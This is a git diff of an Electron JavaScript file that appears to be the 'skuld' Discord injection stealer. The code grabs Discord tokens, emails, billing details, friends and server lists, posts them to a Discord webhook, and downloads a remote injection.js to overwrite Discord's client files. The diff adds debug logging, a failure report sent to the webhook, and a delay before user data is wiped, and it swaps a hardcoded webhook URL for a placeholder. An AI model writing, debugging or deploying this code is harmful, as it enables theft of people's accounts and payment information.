@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1483267080567390281/MyHJkDdAvJMpWqh6uZf0thbGYq6adVlhBZOjq1JyVr9P_o4OpVDOBt_QNuGljk_HsKBb",
+    webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
     filters: {
         urls: [
@@ -146,6 +146,11 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
+    console.log('DEBUG: Hooker function called');
+    console.log('DEBUG: Account username:', account ? account.username : 'N/A');
+    console.log('DEBUG: Token present:', token ? 'YES' : 'NO');
+    console.log('DEBUG: Webhook URL:', CONFIG.webhook);
+    
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "skuld - cord injection";
     content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
@@ -161,11 +166,14 @@ const hooker = async (content, token, account) => {
     };
     content["embeds"][0]["title"] = "Account Information";
 
+    console.log('DEBUG: Getting detailed account data...');
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
+    console.log('DEBUG: Fetching billing info...');
     const billing = await getBilling(token);
-
+    console.log('DEBUG: Fetching friends...');
     const friends = await getFriends(token);
+    console.log('DEBUG: Fetching servers...');
     const servers = await getServers(token);
 
     content["embeds"][0]["fields"].push({
@@ -198,9 +206,17 @@ const hooker = async (content, token, account) => {
         content["embeds"][embed]["color"] = 0xb143e3;
     }
 
-    await request("POST", CONFIG.webhook, {
-        "Content-Type": "application/json"
-    }, JSON.stringify(content));
+    console.log('DEBUG: Sending webhook data...');
+    console.log('DEBUG: Payload size:', JSON.stringify(content).length);
+    
+    try {
+        await request("POST", CONFIG.webhook, {
+            "Content-Type": "application/json"
+        }, JSON.stringify(content));
+        console.log('DEBUG: Webhook sent successfully!');
+    } catch (error) {
+        console.log('DEBUG: Webhook send failed:', error);
+    }
 };
 
 const fetch = async (endpoint, headers) => {
@@ -472,18 +488,36 @@ const discordPath = (function () {
 })();
 
 async function initiation() {
+    console.log('DEBUG: Initiation function called');
+    console.log('DEBUG: __dirname:', __dirname);
+    console.log('DEBUG: Checking for initiation folder:', path.join(__dirname, 'initiation'));
+    console.log('DEBUG: Initiation folder exists:', fs.existsSync(path.join(__dirname, 'initiation')));
+    
     if (fs.existsSync(path.join(__dirname, 'initiation'))) {
+        console.log('DEBUG: Removing initiation folder and starting token extraction...');
         fs.rmdirSync(path.join(__dirname, 'initiation'));
 
         const token = await getToken();
-        console.log('Token extracted:', token ? 'SUCCESS' : 'FAILED');
-        if (!token) return;
+        console.log('DEBUG: Token extracted:', token ? 'SUCCESS' : 'FAILED');
+        console.log('DEBUG: Token length:', token ? token.length : 'N/A');
+        
+        if (!token) {
+            console.log('DEBUG: No token found, sending error message...');
+            await request("POST", CONFIG.webhook, {
+                "Content-Type": "application/json"
+            }, JSON.stringify({
+                "content": "❌ **Discord Injection Failed** - No token found!"
+            }));
+            return;
+        }
 
-        const account = await fetchAccount(token)
+        console.log('DEBUG: Fetching account info...');
+        const account = await fetchAccount(token);
+        console.log('DEBUG: Account info:', account ? 'SUCCESS' : 'FAILED');
+        console.log('DEBUG: Username:', account ? account.username : 'N/A');
 
         const content = {
             "content": `**${account.username}** just got injected!`,
-
             "embeds": [{
                 "fields": [{
                     "name": "Email",
@@ -497,8 +531,15 @@ async function initiation() {
             }]
         };
 
+        console.log('DEBUG: Sending full account data via hooker...');
         await hooker(content, token, account);
-        clearAllUserData();
+        console.log('DEBUG: Data sent successfully!');
+        
+        // Don't clear user data immediately, wait a bit
+        setTimeout(() => {
+            console.log('DEBUG: Clearing user data...');
+            clearAllUserData();
+        }, 3000);
     }
 
     const {
@@ -539,7 +580,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('https://discord.com/api/webhooks/1483267080567390281/MyHJkDdAvJMpWqh6uZf0thbGYq6adVlhBZOjq1JyVr9P_o4OpVDOBt_QNuGljk_HsKBb', '${CONFIG.webhook}')
+          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
